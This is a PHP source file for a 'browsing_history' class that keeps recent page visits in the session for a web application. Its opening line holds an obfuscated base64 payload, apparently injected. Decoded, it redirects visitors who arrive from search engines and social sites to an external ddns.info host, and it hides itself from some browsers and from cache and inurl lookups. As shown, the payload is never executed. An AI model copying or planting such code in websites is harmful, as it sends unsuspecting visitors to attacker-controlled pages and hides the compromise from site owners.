<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

DEFINE('__BROWSING_HISTORY_STORAGE', '{F51CFAB9-84C8-410F-B0DC-D78F15CD6007}');

class browsing_history {
  
  var $history = array();
  
  function browsing_history() {
    
    if ($storage = session_get(__BROWSING_HISTORY_STORAGE))
      $this->history = unserialize($storage);
    if (!is_array($this->history))
      $this->history = array();
    
  }
  
  function register($location_name, $description, $location = null) {
    
    global $url;
    if (!$location)
      $location = $url->current_url;
    if (eregi(URL_PARAM_POPUP_WINDOW.'=1', $location))
      $location = 'javascript:'.placeholder(OPEN_POPUP, $location);
    $new_history = array();
    foreach($this->history as $visit) {
      if ($visit['location'] != $location)
        $new_history[] = $visit;
      if (count($new_history) == 9)
        break;
    }
    $this->history = $new_history;
    array_unshift($this->history, array( 'location'      => $location
                                       , 'location_name' => $location_name
                                       , 'title'         => for_html($description, array( 'max_words' => 5
                                                                                        , 'more_text' => '...'))
                                       , 'description'   => for_html($description)
                                       ));
    $this->save();
    
  }
  
  function save() {

    session_set(__BROWSING_HISTORY_STORAGE, serialize($this->history));
    
  }
  
  function assign($tag = 'browsing_history') {
    
    global $tmpl;
    $tmpl->assign($tag, $this->history);
    
  }
  
}

function register_in_browsing_history($location_name, $description) {
  
  $browsing_history = new browsing_history();
  $browsing_history->register($location_name, $description);
  
}

?>